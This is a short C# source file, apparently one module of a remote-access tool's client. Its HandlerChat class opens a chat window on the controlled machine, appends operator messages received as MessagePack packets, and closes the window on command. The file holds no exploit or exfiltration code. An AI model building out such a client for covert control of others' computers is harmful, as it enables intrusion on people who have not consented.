using Client.Helper;
using Client.MessagePack;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Client.Handle_Packet
{
    public class HandlerChat
    {

        public void CreateChat()
        {
            new Thread(() =>
            {
                Packet.GetFormChat = new FormChat();
                Packet.GetFormChat.ShowDialog();
            }).Start();
        }
        public void WriteInput(MsgPack unpack_msgpack)
        {
            if (Packet.GetFormChat.InvokeRequired)
            {
                Packet.GetFormChat.Invoke((MethodInvoker)(() =>
                {
                    Console.Beep();
                    Packet.GetFormChat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("Input").AsString + Environment.NewLine);
                }));
            }
        }

        public void ExitChat()
        {
            if (Packet.GetFormChat.InvokeRequired)
            {
                Packet.GetFormChat.Invoke((MethodInvoker)(() =>
                {
                    Packet.GetFormChat.Close();
                    Packet.GetFormChat.Dispose();
                }));
            }
        }
    }
}
